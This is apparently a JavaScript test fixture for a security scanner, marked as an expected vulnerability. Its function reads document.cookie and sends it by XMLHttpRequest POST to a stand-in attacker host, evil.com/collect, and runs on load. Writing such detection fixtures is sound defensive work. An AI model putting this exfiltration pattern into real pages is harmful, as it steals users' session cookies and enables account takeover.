/**
 * Test: Data leak via XMLHttpRequest body
 * Expected: VULNERABILITY - cookie to XHR
 */

function test() {
  var sensitive = document.cookie;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://evil.com/collect');
  xhr.send(sensitive);
}

test();
